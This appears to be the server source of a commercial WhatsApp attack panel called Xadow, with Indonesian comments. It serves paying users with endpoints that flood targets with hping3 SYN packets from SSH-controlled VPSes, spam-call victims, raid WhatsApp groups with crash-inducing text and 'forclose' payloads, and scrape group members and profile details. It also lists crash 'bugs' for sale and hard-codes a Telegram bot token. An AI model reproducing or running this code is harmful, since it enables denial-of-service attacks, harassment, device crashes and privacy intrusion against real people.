const originalStdoutWrite = process.stdout.write.bind(process.stdout);
const originalStderrWrite = process.stderr.write.bind(process.stderr);

process.on('unhandledRejection', (reason, promise) => {
  console.log('Unhandled Rejection:', reason);
});
process.on('uncaughtException', (err) => {
  console.log('Uncaught Exception:', err);
});

process.stdout.write = (chunk, encoding, callback) => {
  if (typeof chunk === 'string' && (
    chunk.includes('Closing stale open session') ||
    chunk.includes('Closing session') ||
    chunk.includes('Failed to decrypt message') ||
    chunk.includes('Session error') ||
    chunk.includes('Closing open session') ||
    chunk.includes('Removing old closed'))
  ) return true;
  return originalStdoutWrite(chunk, encoding, callback);
};

process.stderr.write = (chunk, encoding, callback) => {
  if (typeof chunk === 'string' && (
    chunk.includes('Closing stale open session') ||
    chunk.includes('Closing session:') ||
    chunk.includes('Failed to decrypt message') ||
    chunk.includes('Session error:') ||
    chunk.includes('Closing open session') ||
    chunk.includes('Removing old closed'))
  ) return true;
  return originalStderrWrite(chunk, encoding, callback);
};

const safeExit = process.exit;

// ========== DEPENDENCIES & MODULES ==========
const {
    default: makeWASocket,
    useMultiFileAuthState,
    downloadContentFromMessage,
    emitGroupParticipantsUpdate,
    emitGroupUpdate,
    generateWAMessageContent,
    generateWAMessage,
    makeInMemoryStore,
    prepareWAMessageMedia,
    generateWAMessageFromContent,
    areJidsSameUser,
    WAMessageStatus,
    downloadAndSaveMediaMessage,
    getContentType,
    useSingleFileAuthState,
    BufferJSON,
    WAMessageProto,
    MessageOptions,
    WAFlag,
    WANode,
    WAMetric,
    ChatModification,
    MessageTypeProto,
    WALocationMessage,
    ReconnectMode,
    WAContextInfo,
    proto,
    WAGroupMetadata,
    ProxyAgent,
    waChatKey,
    MimetypeMap,
    MediaPathMap,
    WAContactMessage,
    WAContactsArrayMessage,
    WAGroupInviteMessage,
    WATextMessage,
    WAMessageContent,
    WAMessage,
    BaileysError,
    WA_MESSAGE_STATUS_TYPE,
    MediaConnInfo,
    URL_REGEX,
    WAUrlInfo,
    WA_DEFAULT_EPHEMERAL,
    WAMediaUpload,
    jidDecode,
    mentionedJid,
    processTime,
    Browser,
    MessageType,
    makeChatsSocket,
    generateProfilePicture,
    Presence,
    WA_MESSAGE_STUB_TYPES,
    Mimetype,
    relayWAMessage,
    Browsers,
    GroupSettingChange,
    DisconnectReason,
    WASocket,
    encodeWAMessage,
    getStream,
    WAProto,
    isBaileys,
    AnyMessageContent,
    fetchLatestWaWebVersion,
    templateMessage,
    fetchLatestBaileysVersion,
} = require('@whiskeysockets/baileys');

const express = require("express");
const readline = require("readline");
const crypto = require("crypto");
const app = express();
const TelegramBot = require("node-telegram-bot-api");
const fs = require("fs");
const path = require('path');
const pino = require('pino');
const P = require('pino')
const axios = require('axios')
const vm = require('vm')
const os = require('os');
const WebSocket = require('ws');
const http = require('http');
const multer = require('multer');
const server = http.createServer(app); // gunakan Express app
const wss = new WebSocket.Server({ server });
let wsClients = {}; // { username: WebSocket }
let chatList = [];  // { from, to, message, time }
const CHAT_FILE = 'chat.json';
const { Client } = require('ssh2');
const DB_PATH = "./database.json";
let activeKeys = {};
const KEY_FILE = path.join(__dirname, 'keyList.json');

// ============================================================
// HELPER FUNCTIONS
// ============================================================
function readJSON(file, def = []) {
  try { return fs.existsSync(file) ? JSON.parse(fs.readFileSync(file, 'utf8')) : def; }
  catch { return def; }
}
function writeJSON(file, data) {
  fs.writeFileSync(file, JSON.stringify(data, null, 2));
}
function getUser(key) {
  const keys = readJSON(KEY_FILE, []);
  return keys.find(k => k.sessionKey === key) || null;
}

// ============================================================
// CHAT APP — DB paths & multer
// ============================================================
const CHAT_DB     = path.join(__dirname, 'appChat.json');
const PRIVATE_DB  = path.join(__dirname, 'privateChat.json');
const STATUS_DB   = path.join(__dirname, 'statusData.json');
const BLOCKED_DB  = path.join(__dirname, 'blockedUsers.json');
const UPLOADS_DIR = path.join(__dirname, 'uploads');

if (!fs.existsSync(UPLOADS_DIR)) fs.mkdirSync(UPLOADS_DIR, { recursive: true });

app.use('/uploads', express.static(UPLOADS_DIR));

// ── STATIC WEB PANEL ──────────────────────────────────────────
const PUBLIC_DIR = path.join(__dirname, 'public');
if (!fs.existsSync(PUBLIC_DIR)) fs.mkdirSync(PUBLIC_DIR, { recursive: true });
app.use(express.static(PUBLIC_DIR));
// ──────────────────────────────────────────────────────────────

const chatUpload = multer({
  storage: multer.diskStorage({
    destination: (_, __, cb) => cb(null, UPLOADS_DIR),
    filename:    (_, file, cb) => cb(null, `${Date.now()}_${file.originalname.replace(/\s+/g, '_')}`),
  }),
  limits: { fileSize: 20 * 1024 * 1024 },
  fileFilter: (_, file, cb) => {
    const allowed = ['image/jpeg','image/png','image/gif','image/webp','audio/mpeg','audio/ogg','audio/aac','audio/wav','audio/mp4','audio/webm'];
    cb(null, allowed.includes(file.mimetype));
  },
});

function isBlockedPair(userA, userB) {
  const all = readJSON(BLOCKED_DB, []);
  return all.some(b => b.blocker === userA && b.blocked === userB);
}
// ============================================================


const bugs = [
  //{ bug_id: "crash_spam", bug_name: "Spam Crash" },
  { bug_id: "delay", bug_name: "Delay Hard" },
  { bug_id: "android", bug_name: "Xadow Crasher" },
  { bug_id: "invisible", bug_name: "invizible" },
  { bug_id: "iosvisible", bug_name: "ios visible" },
  { bug_id: "forclose", bug_name: "forclose hard" },
  { bug_id: "ui_kill", bug_name: "XadowInviz" },
  { bug_id: "crashvideo", bug_name: "Freeze Home" },
];
let cncActive = true; // Flag CNC
let vpsList = [];
let vpsConnections = {}
const VPS_FILE = 'vps.json';
let sikmanuk = JSON.parse(fs.readFileSync("keyList.json", "utf8"));
fs.watchFile("keyList.json", () => {
  console.log("[📂] keyList.json changed, reloading...");
  sikmanuk = JSON.parse(fs.readFileSync("keyList.json", "utf8"));
});

// Load chat from file
if (fs.existsSync(CHAT_FILE)) {
  chatList = JSON.parse(fs.readFileSync(CHAT_FILE, 'utf8'));
}

// Simpan chat
function saveChat() {
  fs.writeFileSync(CHAT_FILE, JSON.stringify(chatList, null, 2));
}

// Sanitize fungsi
function sanitize(input) {
  return String(input)
    .replace(/[<>]/g, '') // hilangkan tag html
    .replace(/[\r\n]/g, ' ') // hilangkan newline
    .slice(0, 250); // batas 250 karakter
}

const TOKEN = "8639668728:AAE49XOCLVtC6i-bOWB64YKRrwnELsjKpgg"; // Ganti dengan token bot kamu
const bot = new TelegramBot(TOKEN, { polling: true });

const ID_GROUP = [
    -1004400145215,
];

const ID_GROUP_UTAMA = [
    -1004400145215,
];

function sendToGroups(text, options = {}) {
    for (const groupid of ID_GROUP) {
        bot.sendMessage(groupid, text, options).catch(err => {
            console.error(`Gagal kirim ke ${groupid}:`, err.response?.body || err.message);
        });
    }
}

function sendToGroupsUtama(text, options = {}) {
    for (const groupid of ID_GROUP_UTAMA) {
        bot.sendMessage(groupid, text, options).catch(err => {
            console.error(`Gagal kirim ke ${groupid}:`, err.response?.body || err.message);
        });
    }
}

const OWNER_ID = 7410137920;
  
wss.on('connection', function (ws, req) {
  let username;

  ws.on('message', function (msg) {
    try {
      const data = JSON.parse(msg);

        if (data.type === 'sessionCheck') {
  const sessionList = JSON.parse(fs.readFileSync("keyList.json", "utf8"));
  const user = sessionList.find(e => e.sessionKey === data.key);

  if (!user) {
    ws.send(JSON.stringify({
      type: "forceLogout",
      reason: "Invalid key"
    }));
    return ws.close();
  }

  if (user.androidId !== data.androidId) {
    ws.send(JSON.stringify({
      type: "forceLogout",
      reason: "Another device has logged in"
    }));
    return ws.close();
  }
}

      if (data.type === 'validate') {
        const session = JSON.parse(fs.readFileSync("keyList.json", "utf8"));
        const validKey = session.find(e => e.sessionKey === data.key)
          
        if (!validKey) {
          ws.send(JSON.stringify({
            type: "myInfo",
            valid: false,
            reason: "keyInvalid"
          }));
          return ws.close();
        }

        if (!data.androidId || validKey.androidId !== data.androidId) {
          ws.send(JSON.stringify({
            type: "myInfo",
            valid: false,
            reason: "androidIdMismatch"
          }));
          return ws.close();
        }

        // Autentikasi sukses
        ws.send(JSON.stringify({
          type: "myInfo",
          valid: true,
          username: validKey.username,
          androidId: validKey.androidId,
          role: validKey.role || "member"
        }));

            const interval = setInterval(() => {
            const session = JSON.parse(fs.readFileSync("keyList.json", "utf8"));
        const validKey = session.find(e => e.sessionKey === data.key)
          
        if (!validKey) {
          ws.send(JSON.stringify({
            type: "myInfo",
            valid: false,
            reason: "keyInvalid"
          }));
          return ws.close();
        }

        if (!data.androidId || validKey.androidId !== data.androidId) {
          ws.send(JSON.stringify({
            type: "myInfo",
            valid: false,
            reason: "androidIdMismatch"
          }));
          return ws.close();
        }

            }, 10000);
      }
      if (data.type === 'auth') {
        username = getUserByKey(data.key);
         console.log(username)
        if (!username) return ws.close();
        wsClients[username] = ws;

        // Kirim chatList awal
const list = chatList
  .filter(m => m.from === username || m.to === username)
  .map(m => (m.from === username ? m.to : m.from));

  ws.send(JSON.stringify({
    type: "chatList",
    users: [...new Set(list)],
  }));
      }

      if (data.type === 'chat') {
        const to = data.to;
        const message = sanitize(data.message);
if (!username || !to || !message || message.length > 250) return;

        const chat = {
          from: username,
          to,
          message,
          time: new Date().toISOString()
        };
        chatList.push(chat);
        saveChat();

        // Kirim ke pengirim
        ws.send(JSON.stringify({ type: 'chat', message: { ...chat, fromMe: true } }));

        // Kirim ke penerima jika online
        if (wsClients[to]) {
          wsClients[to].send(JSON.stringify({
            type: 'chat',
            message: { ...chat, fromMe: false }
          }));
        }
      }

      if (data.type === 'getMessages') {
        const withUser = data.with;
        const messages = chatList
          .filter(m =>
            (m.from === username && m.to === withUser) ||
            (m.from === withUser && m.to === username)
          )
          .map(m => ({
            ...m,
            fromMe: m.from === username
          }));

        ws.send(JSON.stringify({ type: 'messages', with: withUser, messages }));
      }
    } catch (e) {
      console.error("WS error:", e.message);
    }
  });

  ws.on('close', () => {
    if (username && wsClients[username]) {
      delete wsClients[username];
    }
  });
});

// Ganti listen jadi ini:
const wsPort = 4253;
server.listen(wsPort, () => {
  console.log(`⌬ SERVER ACTIVE ✅ , PORT: ${wsPort}`);
});

const PORT = 4253;




app.use(express.urlencoded({ extended: false }));
app.use(express.json());
// ===== Rate Limit Middleware (20 req/detik per token) =====
const rateLimitMap = {};
function rateLimiter(req, res, next) {
  const key = (req.query && req.query.key) || (req.body && req.body.key) || null;
  if (!key) return next();

  const now = Date.now();
  if (!rateLimitMap[key]) rateLimitMap[key] = [];

  rateLimitMap[key] = rateLimitMap[key].filter(ts => now - ts < 1000);
  rateLimitMap[key].push(now);

  if (rateLimitMap[key].length > 2) {
    const db = loadDatabase();
    const user = db.find(u => u.username === (activeKeys[key]?.username || "unknown"));
    console.warn(`[🚫 RATE LIMIT] Token '${key}' (${user?.username || 'unknown'}) melebihi batas 20 req/detik.`);

    return res.status(429).json({
      valid: false,
      rateLimit: true,
      message: "Terlalu banyak permintaan! Maksimal 20 request per detik.",
    });
  }

  next();
}

app.use(rateLimiter);


app.use((req, res, next) => {
  res.header("Access-Control-Allow-Origin", "*"); // atau ganti * dengan domain spesifik
  res.header("Access-Control-Allow-Methods", "GET, POST, OPTIONS");
  res.header("Access-Control-Allow-Headers", "Content-Type");
  next();
});


if (fs.existsSync(KEY_FILE)) {
  try {
    const rawData = fs.readFileSync(KEY_FILE, 'utf8');
    const parsed = JSON.parse(rawData); // ini array

    for (const user of parsed) {
      if (user.sessionKey && user.username && user.lastLogin) {
        const created = new Date(user.lastLogin).getTime();
        const expires = created + 10 * 60 * 1000; // +10 menit

        activeKeys[user.sessionKey] = {
          username: user.username,
          created,
          expires,
        };
      }
    }

    console.log("✅ activeKeys loaded from keyList.json.");
  } catch (err) {
    console.error("❌ Failed to load keyList.json:", err.message);
  }
}


function connectToAllVPS() {
  if (!cncActive) return;

  console.log("🔄 Connecting to all VPS servers...");

  for (const vps of vpsList) {
    if (vpsConnections[vps.host]) {
      console.log(`✅ Already connected to ${vps.host}`);
      continue;
    }

    const conn = new Client();

    conn.on('ready', () => {
      if (!cncActive) {
        conn.end(); // Langsung tutup kalau CNC tidak aktif
        return;
      }

      console.log(`✅ Connected to VPS: ${vps.host}`);
      vpsConnections[vps.host] = conn;

      // Jika koneksi putus, reconnect otomatis
      conn.on('close', () => {
        console.log(`🔌 Disconnected: ${vps.host}`);
        delete vpsConnections[vps.host];

        if (cncActive) {
          console.log(`🔁 Reconnecting to ${vps.host} in 5s...`);
          setTimeout(connectToAllVPS, 5000);
        }
      });
    });

    conn.on('error', (err) => {
      console.log(`❌ Failed to connect to ${vps.host}: ${err.message}`);
    });

    conn.connect({
      host: vps.host,
      username: vps.username,
      password: vps.password,
      readyTimeout: 5000
    });
  }
}

// 🚫 Disconnect semua koneksi (misal saat restart)
function disconnectAllVPS() {
  console.log("🛑 Disconnecting all VPS connections...");
  cncActive = false;

  for (const host in vpsConnections) {
    vpsConnections[host].end();
    delete vpsConnections[host];
  }
}

// Load VPS list saat server pertama kali jalan
if (fs.existsSync(VPS_FILE)) {
  vpsList = JSON.parse(fs.readFileSync(VPS_FILE, 'utf8'));
  console.log("📥 VPS list loaded.");
    connectToAllVPS(); // Connect ke semua VPS saat server jalan
}

// Pantau perubahan file VPS
fs.watch(VPS_FILE, () => {
  try {
    vpsList = JSON.parse(fs.readFileSync(VPS_FILE, 'utf8'));
    console.log("🔄 VPS list updated.");
      connectToAllVPS(); // Connect ke semua VPS saat server jalan
  } catch (e) {
    console.error("❌ Failed to update VPS list:", e.message);
  }
});

// Middleware: Cek sessionKey dan ambil username
function getUserByKey(key) {
  const keyInfo = activeKeys[key];
  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  return user ? keyInfo.username : null;
}

// GET /myServer
app.get("/myServer", (req, res) => {
  const key = req.query.key;
  const username = getUserByKey(key);
  if (!username) return res.status(401).json({ error: "Invalid session key" });

  const userVPS = vpsList.filter(vps => vps.owner === username);
  res.json(userVPS);
});

// POST /addServer
app.post("/addServer", (req, res) => {
  const { key, host, username: sshUser, password } = req.body;
  const owner = getUserByKey(key);
  if (!owner) return res.status(401).json({ error: "Invalid session key" });

  if (!host || !sshUser || !password) return res.status(400).json({ error: "Missing fields" });

  const newVPS = { host, username: sshUser, password, owner };
  vpsList.push(newVPS);
  fs.writeFileSync(VPS_FILE, JSON.stringify(vpsList, null, 2));
  res.json({ success: true, message: "VPS added" });
});

// POST /delServer
app.post("/delServer", (req, res) => {
  const { key, host } = req.body;
  const owner = getUserByKey(key);
  if (!owner) return res.status(401).json({ error: "Invalid session key" });

  const before = vpsList.length;
  vpsList = vpsList.filter(vps => !(vps.host === host && vps.owner === owner));
  fs.writeFileSync(VPS_FILE, JSON.stringify(vpsList, null, 2));

  const deleted = before !== vpsList.length;
  res.json({ success: deleted, message: deleted ? "VPS deleted" : "VPS not found" });
});

// POST /sendCommand
app.post("/sendCommand", (req, res) => {
  const { key, target, port, duration } = req.body;
  const owner = getUserByKey(key);
  if (!owner) return res.status(401).json({ error: "Invalid session key" });

  if (!target || !port || !duration) return res.status(400).json({ error: "Missing fields" });

  const userVPS = vpsList.filter(vps => vps.owner === owner);
  if (userVPS.length === 0) return res.status(400).json({ error: "No VPS available for this user" });

  for (const vps of userVPS) {
    const conn = vpsConnections[vps.host];
    if (!conn) {
      console.log(`❌ Not connected to ${vps.host}`);
      continue;
    }

    const command = `screen -dmS hping3 -S --flood ${target} -p ${port}`;
    const killCmd = `sleep ${duration}; pkill screen`;

    conn.exec(`${command} && ${killCmd}`, (err, stream) => {
      if (err) return console.error(`❌ Exec error on ${vps.host}:`, err.message);
      stream.on('close', (code, signal) => {
        console.log(`✅ Command done on ${vps.host} (code: ${code})`);
      });
    });
  }

  res.json({ success: true, message: `Command sent to ${userVPS.length} VPS` });
});


function loadDatabase() {
  if (!fs.existsSync(DB_PATH)) {
    fs.writeFileSync(DB_PATH, JSON.stringify([]));
    console.log("[🗃️ DB] Database baru dibuat.");
  }
  const data = JSON.parse(fs.readFileSync(DB_PATH));
  return data;
}

function saveDatabase(data) {
  fs.writeFileSync(DB_PATH, JSON.stringify(data, null, 2));
}

function generateKey() {
  const key = crypto.randomBytes(8).toString("hex");
  console.log("[🔑 GEN] Key baru dibuat:", key);
  return key;
}

function isExpired(user) {
  const expired = new Date(user.expiredDate) < new Date();
  console.log(`[⏳ EXP] ${user.username} expired:`, expired);
  return expired;
}
const spamCooldown = {}; // { username: { count, lastReset } }
const cooldowns = {}; // { username: lastRaidTime }

app.get("/spamCall", async (req, res) => {
  const { key, target, qty } = req.query;

  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user || !["reseller", "reseller1", "owner", "vip"].includes(user.role)) {
    return res.json({ valid: false, message: "Access denied" });
  }

  const role = user.role || "member";
  const maxQty = role === "vip" ? 10 : 5;
  const callQty = parseInt(qty) || 1;

  if (callQty > maxQty) {
    return res.json({
      valid: false,
      message: `Qty too high. Max allowed for your role (${role}) is ${maxQty}.`
    });
  }

  const bizKeys = Object.keys(activeConnections);
  if (!bizKeys.length) return res.json({ valid: false, message: "No biz socket online" });

  const jid = target.includes("@s.whatsapp.net") ? target : `${target}@s.whatsapp.net`;

  const now = Date.now();
  const cooldown = spamCooldown[user.username] || { count: 0, lastReset: 0 };

  if (now - cooldown.lastReset > 300_000) {
    cooldown.count = 0;
    cooldown.lastReset = now;
  }

  if (cooldown.count >= 5) {
    const remaining = 300 - Math.floor((now - cooldown.lastReset) / 1000);
    return res.json({ valid: false, cooldown: true, message: `Cooldown: wait ${remaining}s` });
  }

  try {
      
    const socketId = bizKeys[Math.floor(Math.random() * bizKeys.length)];
    const sock = biz[socketId];
    // 1. Unblock target dulu
    await sock.updateBlockStatus(jid, "unblock");

    await sock.offerCall(jid, true);dulu
    await sock.updateBlockStatus(jid, "block");
    console.log(`[✅ FIRST SPAM CALL] to ${jid} from ${socketId}`);

    cooldown.count++;
    spamCooldown[user.username] = cooldown;

    res.json({ valid: true, sended: true, total: callQty });

    for (let i = 1; i < callQty; i++) {
      setTimeout(async () => {
        try {
          const socketId = bizKeys[Math.floor(Math.random() * bizKeys.length)];
          const sock = biz[socketId];
                // 1. Unblock target dulu
    await sock.updateBlockStatus(jid, "unblock");

    await sock.offerCall(jid, true);
                // 1. Unblock target dulu
    await sock.updateBlockStatus(jid, "block");

          console.log(`[✅ SPAM CALL] #${i + 1} to ${jid} from ${socketId}`);
        } catch (err) {
          console.warn(`[❌ CALL #${i + 1} ERROR]`, err.message);
        }
      }, i * 10000);
    }
  } catch (err) {
    console.warn("[❌ FIRST CALL ERROR]", err.message);
    return res.json({ valid: false, message: "Call failed" });
  }
});

app.get("/raidGroup", async (req, res) => {
  const { key, link } = req.query;
  const match = link.match(/chat\.whatsapp\.com\/([a-zA-Z0-9]{22})/);
  if (!match) return res.json({ valid: false, message: "Invalid group link" });

  return res.json({ valid: true, sended: false });
  const code = match[1];
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user || !["vip", "owner"].includes(user.role)) {
    return res.json({ valid: false, message: "Access denied" });
  }

  const now = Date.now();
  if (cooldowns[user.username] && now - cooldowns[user.username] < 500_000) {
    const wait = Math.ceil((500_000 - (now - cooldowns[user.username])) / 1000);
    return res.json({ valid: false, message: `Cooldown aktif, tunggu ${wait} detik` });
  }

  const bizKeys = Object.keys(biz);
  if (bizKeys.length < 2) return res.json({ valid: false, message: "Need at least 2 bot online" });

  const fs = require("fs");
  const path = require("path");
  const dir = path.join(__dirname, "assets");
  const stickers = fs.readdirSync(dir).filter(f => f.endsWith(".webp"));
  if (!stickers.length) return res.json({ valid: false, message: "No stickers found" });

  try {
    const pickRandomSock = async (used = []) => {
      const unused = bizKeys.filter(k => !used.includes(k));
      if (!unused.length) throw new Error("No available bots to use");
      const randKey = unused[Math.floor(Math.random() * unused.length)];
      return { sock: biz[randKey], key: randKey };
    };

    const joinGroup = async () => {
      const usedKeys = [];
      while (true) {
        const { sock, key } = await pickRandomSock(usedKeys);
        usedKeys.push(key);
        try {
          const groupJid = await sock.groupAcceptInvite(code);
          return { sock, groupJid };
        } catch (err) {
          if (err.message.includes("not-authorized")) {
            console.log(`[!] ${key} gagal join, coba bot lain...`);
            continue;
          } else {
            throw err;
          }
        }
      }
    };

    const [s1, s2] = await Promise.all([joinGroup(), joinGroup()]);
    res.json({ valid: true, sended: true });

    cooldowns[user.username] = Date.now();

    const raidBot = async (sock, groupJid) => {
      for (let round = 0; round < 2; round++) {
        const sentMsg = await sock.sendMessage(groupJid, {
          text: `[Xadow Project]\n` + 'ꦾ'.repeat(30000)
        });
        await new Promise(r => setTimeout(r, 1000));

        const randomStickers = stickers.sort(() => 0.5 - Math.random()).slice(0, 3);
        for (const sticker of randomStickers) {
          const buffer = fs.readFileSync(path.join(dir, sticker));
          await sock.sendMessage(groupJid, { sticker: buffer });
          await FaiqForclose(sock, groupJid);
          await FaiqForclose(sock, groupJid);
          await new Promise(r => setTimeout(r, 300));
        }

        await new Promise(r => setTimeout(r, 600));
      }

      await sock.groupLeave(groupJid);
      await new Promise(r => setTimeout(r, 500));

      const lastMessagesInChat = {
        key: { remoteJid: groupJid, fromMe: true, id: "" },
        messageTimestamp: Math.floor(Date.now() / 1000)
      };
      await sock.chatModify({
        delete: true,
        lastMessages: [lastMessagesInChat]
      }, groupJid);

      console.log(`[!] Selesai raid & hapus chat: ${groupJid}`);
    };

    await Promise.all([
      raidBot(s1.sock, s1.groupJid),
      raidBot(s2.sock, s2.groupJid)
    ]);

    return;
  } catch (err) {
    console.warn("[❌ RAID ERROR]", err.message);
    return res.json({ valid: false, message: "Join or send failed" });
  }
});

app.get("/spyGroup", async (req, res) => {
  const { key, link } = req.query;
  const match = link.match(/chat\.whatsapp\.com\/([a-zA-Z0-9]{22})/);
  if (!match) return res.json({ valid: false, message: "Invalid link" });

  const code = match[1];
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) return res.json({ valid: false });

  const bizKeys = Object.keys(biz);
  if (!bizKeys.length) return res.json({ valid: false, message: "No socket available" });

  const sock = biz[bizKeys[Math.floor(Math.random() * bizKeys.length)]];

  try {
    const groupJid = await sock.groupAcceptInvite(code);
    const metadata = await sock.groupMetadata(groupJid);

    const admins = metadata.participants.filter(p => p.admin).map(p => p.id.replace(/@.+/, ''));
    const members = metadata.participants.filter(p => !p.admin).map(p => p.id.replace(/@.+/, ''));

    await sock.groupLeave(groupJid);

    return res.json({
      valid: true,
      groupId: groupJid,
      groupName: metadata.subject,
      desc: metadata.desc || "No description",
      admin: admins,
      participant: members,
    });
  } catch (err) {
    console.warn("[❌ SPY GROUP ERROR]", err.message);
    return res.json({ valid: false, message: "Spy failed" });
  }
});

app.get("/getInfo", async (req, res) => {
  const { key, number } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false });

  const bizKeys = Object.keys(biz);
  if (!bizKeys.length) return res.json({ valid: false, message: "No connection" });

  const sock = biz[bizKeys[Math.floor(Math.random() * bizKeys.length)]];
  const jid = number.includes("@") ? number : number + "@s.whatsapp.net";

  try {
    const ppUrl = await sock.profilePictureUrl(jid, 'image').catch(() => null);
    const statusObj = await sock.fetchStatus(jid).catch(() => null);
    const check = await sock.onWhatsApp(number).catch(() => []);
    const info = check[0] || {};

    return res.json({
      valid: true,
      number: number,
      photo: ppUrl || "https://static.vecteezy.com/system/resources/previews/009/292/244/non_2x/default-avatar-icon-of-social-media-user-vector.jpg",
      bio: statusObj?.status || "No bio",
      online: !!statusObj?.lastSeen,
      type: info.biz ? "business" : "personal"
    });
  } catch (err) {
    console.warn("[❌ GETINFO ERROR]", err.message);
    return res.json({ valid: false, message: "Query failed" });
  }
});

const KEY_LIST_FILE = path.join(__dirname, 'keyList.json');

function loadKeyList() {
  try {
    return JSON.parse(fs.readFileSync(KEY_LIST_FILE, 'utf8'));
  } catch {
    return [];                // file belum ada / rusak → mulai kosong
  }
}

function saveKeyList(list) {
  fs.writeFileSync(KEY_LIST_FILE, JSON.stringify(list, null, 2));
}

function resolveKeyInfo(key) {
  if (!key) return null;
  let keyInfo = activeKeys[key];
  if (keyInfo) return keyInfo;

  const list = loadKeyList();
  const record = list.find(e => e.sessionKey === key);
  if (!record) return null;

  const created = new Date(record.lastLogin).getTime();
  keyInfo = {
    username: record.username,
    created,
    expires: created + 10 * 60 * 1000,
  };
  activeKeys[key] = keyInfo;
  return keyInfo;
}

function recordKey({ username, key, role, ip, androidId }) {
  const list = loadKeyList();
  const stamp = new Date().toISOString();
  const idx = list.findIndex(e => e.username === username);

  if (idx !== -1) {
    list[idx] = { username, lastLogin: stamp, sessionKey: key, ipAddress: ip, androidId };
  } else {
    list.push({ username, lastLogin: stamp, sessionKey: key, ipAddress: ip, androidId });
  }

  saveKeyList(list);
}

  const news = [
    {
      image: "https://files.catbox.moe/h46apd.jpg",
      title: "XADOW IS HERE",
      desc: "Powered By @dilzxd4you"
    }
  ];

// ===== Endpoint: Login & Key Fetch (version 3.0 required) =====
app.post("/validate", (req, res) => {
const { username, password, version, androidId } = req.body;

if (!androidId) {
  return res.json({ valid: false, message: "androidId required" });
}

const db = loadDatabase();
const user = db.find(u => u.username === username && u.password === password);

if (!user) return res.json({ valid: false });

if (isExpired(user)) {
  return res.json({ valid: true, expired: true });
}

// Cek apakah device sama
const keyList = loadKeyList();
const existingSession = keyList.find(e => e.username === username);
if (existingSession && existingSession.androidId !== androidId) {
  // device berbeda, override
  console.log(`[📱] Device login baru, override session untuk ${username}`);
}

// generate key baru & override
const key = generateKey();
activeKeys[key] = {
  username,
  created: Date.now(),
  expires: Date.now() + 10 * 60 * 1000,
};

recordKey({
  username,
  key,
  role: user.role || 'member',
  ip: req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.ip,
  androidId,
});

return res.json({
  valid: true,
  expired: false,
  key,
  expiredDate: user.expiredDate,
  telegramId: user.telegramId || "",
  role: user.role || "member",
  listBug: bugs,
  news
});
});

app.get("/myInfo", (req, res) => {
  const { username, password, androidId, key } = req.query;
  console.log("[ℹ️ INFO] Fetching info for:", username);

  const db = loadDatabase();
  const user = db.find(u => u.username === username && u.password === password);
  const keyList = loadKeyList();
  const userKey = keyList.find(k => k.username === username);
  console.log(userKey)

  if (!userKey) {
    console.log("[❌ KEY] Invalid or missing session key.");
    return res.json({ valid: false, reason: "session" });
  }

  if (userKey.androidId !== androidId) {
    console.log("[⚠️ DEVICE] Device mismatch:", userKey.androidId, "!=", androidId);
    return res.json({ valid: false, reason: "device" });
  }

  if (!user) {
    console.log("[❌ INFO] User not found.");
    return res.json({ valid: false });
  }

  if (isExpired(user)) {
    console.log("[⚠️ INFO] User expired.");
    return res.json({ valid: true, expired: true });
  }

  recordKey({
    username,
    key,
    role: user.role || 'member',
    ip: req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.ip,
    androidId
  });

  console.log("[✅ INFO] Info dikirim untuk:", username);

  return res.json({
    valid: true,
    expired: false,
    key,
    username: user.username,
    password: "******",
    expiredDate: user.expiredDate,
    telegramId: user.telegramId || "",
    role: user.role || "member",
    listBug: bugs,
    news: news // ✅ Tambahkan ini
  });
});

app.post("/changepass", (req, res) => {
  const { username, oldPass, newPass } = req.body;
  if (!username || !oldPass || !newPass) {
    return res.json({ success: false, message: "Incomplete data" });
  }

  const db = loadDatabase();
  const idx = db.findIndex(u => u.username === username && u.password === oldPass);
  if (idx === -1) {
    return res.json({ success: false, message: "Invalid credentials" });
  }

  db[idx].password = newPass;
  saveDatabase(db);

  return res.json({ success: true, message: "Password updated successfully" });
});


const GLOBAL_SENDER_FOLDER = "__global__";
const GLOBAL_SENDER_TIMEZONE = "Asia/Jakarta";

function canManageGlobalSender(role = "member") {
  const normalizedRole = normalizeRoleName(role);
  return normalizedRole === "owner" || normalizedRole === "developer";
}

function getGlobalSenderDailyLimit(role = "member") {
  return null;
}

function canUseGlobalSender(role = "member") {
  return true;
}

function formatSenderQuotaDate(date = new Date()) {
  const parts = new Intl.DateTimeFormat("en-GB", {
    timeZone: GLOBAL_SENDER_TIMEZONE,
    year: "numeric",
    month: "2-digit",
    day: "2-digit",
  }).formatToParts(date);

  const year = parts.find(part => part.type === "year")?.value || "0000";
  const month = parts.find(part => part.type === "month")?.value || "00";
  const day = parts.find(part => part.type === "day")?.value || "00";
  return `${year}-${month}-${day}`;
}

function ensureGlobalSenderUsageState(user) {
  const today = formatSenderQuotaDate();
  let changed = false;

  if (!user.globalSenderUsage || typeof user.globalSenderUsage !== "object") {
    user.globalSenderUsage = { date: today, count: 0 };
    return true;
  }

  if (user.globalSenderUsage.date !== today) {
    user.globalSenderUsage.date = today;
    user.globalSenderUsage.count = 0;
    changed = true;
  }

  if (!Number.isFinite(user.globalSenderUsage.count) || user.globalSenderUsage.count < 0) {
    user.globalSenderUsage.count = 0;
    changed = true;
  }

  return changed;
}

function getGlobalSenderQuotaPayload(user) {
  ensureGlobalSenderUsageState(user);

  const normalizedRole = normalizeRoleName(user?.role || "member");
  const limit = getGlobalSenderDailyLimit(normalizedRole);
  const used = Number(user?.globalSenderUsage?.count || 0);
  const unlimited = limit === null;

  return {
    role: normalizedRole,
    canAdd: canManageGlobalSender(normalizedRole),
    canUse: canUseGlobalSender(normalizedRole),
    used,
    limit,
    remaining: unlimited ? null : Math.max(limit - used, 0),
    unlimited,
    date: user?.globalSenderUsage?.date || formatSenderQuotaDate(),
  };
}

function getGlobalSenderDeniedMessage(role = "member") {
  return `Role ${String(role).toUpperCase()} tidak diizinkan memakai Global Sender.`;
}

